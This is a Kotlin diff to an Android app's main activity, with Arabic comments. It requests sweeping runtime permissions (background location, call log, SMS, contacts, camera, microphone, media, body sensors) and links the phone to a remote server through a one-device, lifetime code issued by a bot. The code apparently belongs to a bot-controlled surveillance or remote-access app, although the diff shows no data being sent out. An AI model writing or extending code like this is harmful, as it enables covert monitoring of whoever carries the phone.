@@ -64,28 +64,33 @@ class MainActivity : AppCompatActivity() {
     private var currentActivityResultCode = -1
 
     // ==================== أذونات التشغيل الشاملة ====================
+    // ملاحظة: WRITE_SETTINGS تمت إزالته لأنه إذن خاص يتم طلبه في خطوة منفصلة
+    // إدراجه هنا يسبب عدم ظهور对话框 على بعض الأجهزة
     private val runtimePermissions = arrayOf(
+        // === الموقع ===
         Manifest.permission.ACCESS_FINE_LOCATION,
         Manifest.permission.ACCESS_COARSE_LOCATION,
         Manifest.permission.ACCESS_BACKGROUND_LOCATION,
+        // === الهاتف والمكالمات ===
         Manifest.permission.READ_PHONE_STATE,
         Manifest.permission.READ_CALL_LOG,
-        Manifest.permission.WRITE_CALL_LOG,
         Manifest.permission.ANSWER_PHONE_CALLS,
         Manifest.permission.CALL_PHONE,
+        // === الرسائل وجهات الاتصال ===
         Manifest.permission.READ_SMS,
         Manifest.permission.RECEIVE_SMS,
-        Manifest.permission.SEND_SMS,
         Manifest.permission.READ_CONTACTS,
-        Manifest.permission.WRITE_CONTACTS,
+        // === الكاميرا والصوت ===
         Manifest.permission.CAMERA,
         Manifest.permission.RECORD_AUDIO,
+        // === التخزين والوسائط ===
         Manifest.permission.READ_EXTERNAL_STORAGE,
         Manifest.permission.WRITE_EXTERNAL_STORAGE,
         Manifest.permission.READ_MEDIA_IMAGES,
         Manifest.permission.READ_MEDIA_VIDEO,
         Manifest.permission.READ_MEDIA_AUDIO,
-        Manifest.permission.WRITE_SETTINGS,
+        Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED,
+        // === الإشعارات والحساسات ===
         Manifest.permission.POST_NOTIFICATIONS,
         Manifest.permission.BODY_SENSORS,
         Manifest.permission.ACTIVITY_RECOGNITION
@@ -151,13 +156,11 @@ class MainActivity : AppCompatActivity() {
                 Manifest.permission.POST_NOTIFICATIONS,
                 Manifest.permission.BODY_SENSORS,
                 Manifest.permission.ACTIVITY_RECOGNITION -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU
+                Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE
                 Manifest.permission.ACCESS_BACKGROUND_LOCATION -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q
                 Manifest.permission.ANSWER_PHONE_CALLS -> Build.VERSION.SDK_INT >= Build.VERSION_CODES.P
                 Manifest.permission.WRITE_EXTERNAL_STORAGE -> Build.VERSION.SDK_INT < Build.VERSION_CODES.Q
                 Manifest.permission.READ_EXTERNAL_STORAGE -> Build.VERSION.SDK_INT < Build.VERSION_CODES.R
-                Manifest.permission.SEND_SMS,
-                Manifest.permission.WRITE_CALL_LOG,
-                Manifest.permission.WRITE_CONTACTS -> Build.VERSION.SDK_INT < Build.VERSION_CODES.Q
                 else -> true
             }
         }
@@ -380,14 +383,17 @@ class MainActivity : AppCompatActivity() {
     }
 
     /**
-     * التحقق من كود الربط مع السيرفر
-     * يجب أن يكون الكود مولداً من السيرفر - لا يتم قبوله محلياً
+     * ربط الجهاز مع السيرفر باستخدام كود الربط
+     * الكود يكون مدى الحياة وربط جهاز واحد فقط
      */
     fun verifyLinkCode(code: String) {
         CoroutineScope(SupervisorJob() + Dispatchers.IO).launch {
             try {
-                Log.d("MainActivity", "🔄 التحقق من كود الربط مع السيرفر: $code")
-                jsNotify("onPermissionPending", "link_verify")
+                Log.d("MainActivity", "🔄 جاري ربط الجهاز مع السيرفر: $code")
+                // إظهار حالة الربط في الواجهة
+                runOnUiThread {
+                    jsCall("onLinking()")
+                }
 
                 val url = URL("https://alsydyabwalzhra.online/api/verify_link")
                 val connection = url.openConnection() as HttpURLConnection
@@ -410,72 +416,66 @@ class MainActivity : AppCompatActivity() {
                 Log.d("MainActivity", "استجابة السيرفر: $responseCode - $response")
 
                 if (responseCode in 200..299) {
-                    // تحليل الاستجابة بالتفصيل
                     val jsonResponse = try {
                         org.json.JSONObject(response)
                     } catch (e: Exception) {
                         Log.e("MainActivity", "❌ استجابة غير صالحة من السيرفر: $response")
                         runOnUiThread {
-                            jsCall("onLinkCodeError('استجابة غير صالحة من السيرفر. حاول مرة أخرى.')")
+                            jsCall("onLinkError('استجابة غير صالحة من السيرفر. حاول مرة أخرى.')")
                         }
                         return@launch
                     }
 
                     if (jsonResponse.optBoolean("ok", false)) {
-                        Log.d("MainActivity", "✅ كود الربط صحيح - تم التحقق من السيرفر!")
+                        Log.d("MainActivity", "✅ تم ربط الجهاز بنجاح!")
                         SharedPrefsManager.setLinkCode(this@MainActivity, code)
                         SharedPrefsManager.setDeviceId(this@MainActivity, deviceId)
                         SharedPrefsManager.setBotRegistered(this@MainActivity, true)
 
                         runOnUiThread {
+                            jsCall("onLinkSuccess()")
                             jsNotify("onPermissionGranted", "link")
                             advanceToNextStep()
                         }
                     } else {
                         val errorMsg = jsonResponse.optString("error", "خطأ غير معروف")
-                        Log.e("MainActivity", "❌ كود الربط مرفوض: $errorMsg")
+                        Log.e("MainActivity", "❌ فشل الربط: $errorMsg")
                         val userMsg = when {
-                            errorMsg.contains("expired", ignoreCase = true) -> "⏱️ كود الربط منتهي الصلاحية. أرسل /link في البوت للحصول على كود جديد."
-                            errorMsg.contains("Invalid", ignoreCase = true) -> "❌ كود الربط غير صحيح. تأكد من الكود وحاول مرة أخرى."
-                            errorMsg.contains("used", ignoreCase = true) -> "🔄 هذا الكود تم استخدامه مسبقاً. أرسل /link للحصول على كود جديد."
-                            else -> "❌ خطأ في الكود: $errorMsg"
+                            errorMsg.contains("expired", ignoreCase = true) -> "كود الربط منتهي الصلاحية"
+                            errorMsg.contains("Invalid", ignoreCase = true) || errorMsg.contains("invalid", ignoreCase = true) -> "الكود غير صحيح"
+                            errorMsg.contains("used", ignoreCase = true) -> "هذا الكود تم استخدامه مسبقاً"
+                            else -> errorMsg
                         }
                         runOnUiThread {
-                            jsCall("onLinkCodeError('$userMsg')")
+                            jsCall("onLinkError('$userMsg')")
                         }
                     }
                 } else {
-                    val errorBody = try { connection.errorStream?.bufferedReader()?.readText() ?: "" } catch (e: Exception) { "" }
-                    Log.e("MainActivity", "❌ خطأ السيرفر $responseCode: $errorBody")
                     val userMsg = when {
-                        responseCode == 400 -> "❌ كود الربط غير صحيح أو منتهي الصلاحية. أرسل /link في البوت للحصول على كود جديد."
-                        responseCode == 404 -> "❌ السيرفر غير متاح. تأكد أن البوت يعمل على السيرفر."
-                        responseCode >= 500 -> "⚠️ خطأ في السيرفر. حاول بعد قليل."
-                        else -> "❌ خطأ في الاتصال (رمز $responseCode). حاول مرة أخرى."
+                        responseCode == 400 -> "الكود غير صحيح أو تم استخدامه"
+                        responseCode == 404 -> "السيرفر غير متاح"
+                        responseCode >= 500 -> "خطأ في السيرفر حاول بعد قليل"
+                        else -> "خطأ في الاتصال رمز $responseCode"
                     }
                     runOnUiThread {
-                        jsCall("onLinkCodeError('$userMsg')")
+                        jsCall("onLinkError('$userMsg')")
                     }
                 }
             } catch (e: java.net.SocketTimeoutException) {
-                Log.e("MainActivity", "❌ انتهت مهلة الاتصال بالسيرفر")
                 runOnUiThread {
-                    jsCall("onLinkCodeError('⏱️ انتهت مهلة الاتصال بالسيرفر. تأكد من اتصال الإنترنت وأن السيرفر يعمل.')")
+                    jsCall("onLinkError('انتهت مهلة الاتصال بالسيرفر تأكد من اتصال الإنترنت')")
                 }
             } catch (e: java.net.UnknownHostException) {
-                Log.e("MainActivity", "❌ لا يمكن الوصول للسيرفر")
                 runOnUiThread {
-                    jsCall("onLinkCodeError('🌐 لا يمكن الوصول للسيرفر. تأكد من اتصال الإنترنت.')")
+                    jsCall("onLinkError('لا يمكن الوصول للسيرفر تأكد من اتصال الإنترنت')")
                 }
             } catch (e: javax.net.ssl.SSLException) {
-                Log.e("MainActivity", "❌ خطأ في شهادة SSL")
                 runOnUiThread {
-                    jsCall("onLinkCodeError('🔒 خطأ في الاتصال الآمن. حاول مرة أخرى.')")
+                    jsCall("onLinkError('خطأ في الاتصال الآمن حاول مرة أخرى')")
                 }
             } catch (e: Exception) {
-                Log.e("MainActivity", "❌ خطأ في الاتصال بالسيرفر: ${e.message}")
                 runOnUiThread {
-                    jsCall("onLinkCodeError('❌ خطأ في الاتصال بالسيرفر: ${e.message}. تأكد من اتصال الإنترنت.')")
+                    jsCall("onLinkError('خطأ في الاتصال: ${e.message}')")
                 }
             }
         }
